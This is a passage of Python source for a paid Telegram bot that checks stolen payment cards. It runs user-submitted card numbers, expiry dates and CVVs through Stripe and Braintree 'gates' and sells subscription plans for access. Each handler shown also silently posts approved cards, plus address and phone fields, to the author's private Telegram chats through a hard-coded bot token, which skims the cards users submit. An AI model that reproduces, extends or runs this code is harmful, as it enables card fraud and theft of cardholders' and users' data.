						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
						tlg_params = {"parse_mode": "HTML"}

						i = requests.post(tlg, params=tlg_params)
						live += 1
						bot.send_message(call.from_user.id, msg)
					elif 'risk' in last:
						risk+=1
						bot.send_message(call.from_user.id, risk)
					elif 'CVV' in last:
						tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
						acc =  '-1002111411217'
						mg = f"""<b> 
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Moha_Azouz 
</b>"""
						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
						tlg_params = {"parse_mode": "HTML"}

						i = requests.post(tlg, params=tlg_params)
						ccnn+=1
						bot.send_message(call.from_user.id, msgc)
					else:
						dd += 1
					time.sleep(2)
		except Exception as e:
			print(e)
		stopuser[f'{id}']['status'] = 'start'
		bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗬 ➜ @Moha_Azouz')
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(func=lambda message: message.text.lower().startswith('.au') or message.text.lower().startswith('/au'))
def respond_to_vbv(message):
	id=message.from_user.id
	name = message.from_user.first_name
	gate='stripe auth'
	with open('data.json', 'r') as file:
		json_data = json.load(file)
	try:BL=(json_data[str(id)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		BL='𝗙𝗥𝗘𝗘'
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Moha_Azouz")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/PHP_BL")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
			
¶ Subscription plan prices ⬇️
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
• 1- days ~> 2,5$. ✓
• 3- days ~> 5$. ✓
• 7- days ~> 9$. ✓
• 14- days ~> 14$. ✓
• 1- month ~> 24$. ✓
• 2- month ~> 40$. ✓ 
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
All payment methods are available. 💸
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

𝑪𝑳𝑰𝑪𝑲 /cmds 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Moha_Azouz")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/PHP_BL")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
			
¶ Subscription plan prices ⬇️
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
• 1- days ~> 2,5$. ✓
• 3- days ~> 5$. ✓
• 7- days ~> 9$. ✓
• 14- days ~> 14$. ✓
• 1- month ~> 24$. ✓
• 2- month ~> 40$. ✓ 
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
All payment methods are available. 💸
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

𝑪𝑳𝑰𝑪𝑲 /cmds 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Moha_Azouz")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/PHP_BL")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗬𝗢𝗨 𝗖𝗔𝗡𝗡𝗢𝗧 𝗨𝗦𝗘 𝗧𝗛𝗘 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗘𝗖𝗔𝗨𝗦𝗘 𝗬𝗢𝗨𝗥 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗛𝗔𝗦 𝗘𝗫𝗣𝗜𝗥𝗘𝗗</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	ko = (bot.reply_to(message, "𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗬𝗢𝗨𝗥 𝗖𝗔𝗥𝗗𝗦...⌛").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	last= str(Medo(cc))
	try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	except: pass
	try:
	    level = data['level']
	except:
	    level = 'Unknown'
	try:
		brand = data['brand']
	except:
		brand = 'Unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'Unknown'
	try:
		country = data['country']
		country_flag = data['country_flag']
	except:
		country = 'Unknown'
		country_flag = 'Unknown'
	try:
		bank = data['bank']
	except:
		bank = 'Unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	print(last)
	hh = 'Insufficient Funds'
	dd = '𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌'
	
	msg=f'''<b>𝗣𝗔𝗦𝗦𝗘𝗗  ✅ 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {hh}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @Moha_Azouz
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
	msgd=f'''<b>𝗥𝗘𝗝𝗘𝗖𝗧𝗘𝗗 ❌
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {dd}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @Moha_Azouz
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
	if 'Authenticate Attempt Successful' in last or 'Authenticate Successful' in last or 'authenticate_successful' in last:
		tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
		acc =  '-1002111411217'
		mg = f"""<b> 
❆═══𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══𝙸𝙽𝙵𝙾═══❆
｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ <code>{country} - {country_flag}</code>
❆═══𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Moha_Azouz
</b>"""
		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
		tlg_params = {"parse_mode": "HTML"}
		tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
		acb =  '-1002046977369'
		mag = f"""<b>
{cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
</b>"""
		tly = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acb}&text={mag}"
		tly_params = {"parse_mode": "HTML"}
		a = requests.post(tly, params=tly_params)
		i = requests.post(tlg, params=tlg_params)
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text= msgd)
		
		
@bot.message_handler(func=lambda message: message.text.lower().startswith('.sp') or message.text.lower().startswith('/sp'))
def respond_to_vbv(message):
	id=message.from_user.id
	name = message.from_user.first_name
	gate='stripe 1$ '
	with open('data.json', 'r') as file:
		json_data = json.load(file)
	try:BL=(json_data[str(id)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		BL='𝗙𝗥𝗘𝗘'
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Moha_Azouz")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/PHP_BL")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
			
¶ Subscription plan prices ⬇️
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
• 1- days ~> 2,5$. ✓
• 3- days ~> 5$. ✓
• 7- days ~> 9$. ✓
• 14- days ~> 14$. ✓
• 1- month ~> 24$. ✓
• 2- month ~> 40$. ✓ 
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
All payment methods are available. 💸
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

𝑪𝑳𝑰𝑪𝑲 /cmds 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Moha_Azouz")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/PHP_BL")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
			
¶ Subscription plan prices ⬇️
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
• 1- days ~> 2,5$. ✓
• 3- days ~> 5$. ✓
• 7- days ~> 9$. ✓
• 14- days ~> 14$. ✓
• 1- month ~> 24$. ✓
• 2- month ~> 40$. ✓ 
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
All payment methods are available. 💸
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

𝑪𝑳𝑰𝑪𝑲 /cmds 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Moha_Azouz")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/PHP_BL")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗬𝗢𝗨 𝗖𝗔𝗡𝗡𝗢𝗧 𝗨𝗦𝗘 𝗧𝗛𝗘 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗘𝗖𝗔𝗨𝗦𝗘 𝗬𝗢𝗨𝗥 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗛𝗔𝗦 𝗘𝗫𝗣𝗜𝗥𝗘𝗗</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	ko = (bot.reply_to(message, "𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗬𝗢𝗨𝗥 𝗖𝗔𝗥𝗗𝗦...⌛").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	last= str(sp(cc))
	try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	except: pass
	try:
	    level = data['level']
	except:
	    level = 'Unknown'
	try:
		brand = data['brand']
	except:
		brand = 'Unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'Unknown'
	try:
		country = data['country']
		country_flag = data['country_flag']
	except:
		country = 'Unknown'
		country_flag = 'Unknown'
	try:
		bank = data['bank']
	except:
		bank = 'Unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	print(last)
	hh = 'Insufficient Funds'
	dd = '𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌'
	
	msg=f'''<b>𝗣𝗔𝗦𝗦𝗘𝗗  ✅ 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {hh}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @Moha_Azouz
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
	msgd=f'''<b>𝗥𝗘𝗝𝗘𝗖𝗧𝗘𝗗 ❌
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {dd}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @Moha_Azouz
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
	if 'Authenticate Attempt Successful' in last or 'Authenticate Successful' in last or 'authenticate_successful' in last:
		tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
		acc =  '-1002111411217'
		mg = f"""<b> 
❆═══𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══𝙸𝙽𝙵𝙾═══❆
｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ <code>{country} - {country_flag}</code>
❆═══𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Moha_Azouz
</b>"""
		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
		tlg_params = {"parse_mode": "HTML"}
		tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
		acb =  '-1002046977369'
		mag = f"""<b>
{cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
</b>"""
		tly = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acb}&text={mag}"
		tly_params = {"parse_mode": "HTML"}
		a = requests.post(tly, params=tly_params)
		i = requests.post(tlg, params=tlg_params)
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text= msgd)
		
@bot.message_handler(func=lambda message: message.text.lower().startswith('.bch') or message.text.lower().startswith('/bch'))
def respond_to_vbv(message):
	id=message.from_user.id
	name = message.from_user.first_name
	gate='𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗖𝗛𝗔𝗥𝗚𝗘'
	with open('data.json', 'r') as file:
		json_data = json.load(file)
	try:BL=(json_data[str(id)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		BL='𝗙𝗥𝗘𝗘'
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Moha_Azouz")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/PHP_BL")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
			
¶ Subscription plan prices ⬇️
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
• 1- days ~> 2,5$. ✓
• 3- days ~> 5$. ✓
• 7- days ~> 9$. ✓
• 14- days ~> 14$. ✓
• 1- month ~> 24$. ✓
• 2- month ~> 40$. ✓ 
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
All payment methods are available. 💸
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

𝑪𝑳𝑰𝑪𝑲 /cmds 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Moha_Azouz")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/PHP_BL")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
			
¶ Subscription plan prices ⬇️
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
• 1- days ~> 2,5$. ✓
• 3- days ~> 5$. ✓
• 7- days ~> 9$. ✓
• 14- days ~> 14$. ✓
• 1- month ~> 24$. ✓
• 2- month ~> 40$. ✓ 
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
All payment methods are available. 💸
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

𝑪𝑳𝑰𝑪𝑲 /cmds 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Moha_Azouz")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/PHP_BL")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗬𝗢𝗨 𝗖𝗔𝗡𝗡𝗢𝗧 𝗨𝗦𝗘 𝗧𝗛𝗘 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗘𝗖𝗔𝗨𝗦𝗘 𝗬𝗢𝗨𝗥 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗛𝗔𝗦 𝗘𝗫𝗣𝗜𝗥𝗘𝗗</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	ko = (bot.reply_to(message, "𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗬𝗢𝗨𝗥 𝗖𝗔𝗥𝗗𝗦...⌛").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	last= str(brch(cc))
	try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	except: pass
	try:
	    level = data['level']
	except:
	    level = 'Unknown'
	try:
		brand = data['brand']
	except:
		brand = 'Unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'Unknown'
	try:
		country = data['country']
		country_flag = data['country_flag']
	except:
		country = 'Unknown'
		country_flag = 'Unknown'
	try:
		bank = data['bank']
	except:
		bank = 'Unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	print(last)
	hh = 'Insufficient Funds'
	dd = '𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌'
	
	msg=f'''<b>𝗣𝗔𝗦𝗦𝗘𝗗  ✅ 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {hh}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @Moha_Azouz
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
	msgd=f'''<b>𝗥𝗘𝗝𝗘𝗖𝗧𝗘𝗗 ❌
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {dd}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @Moha_Azouz
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
	if 'Authenticate Attempt Successful' in last or 'Authenticate Successful' in last or 'authenticate_successful' in last:
		tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
		acc =  '-1002111411217'
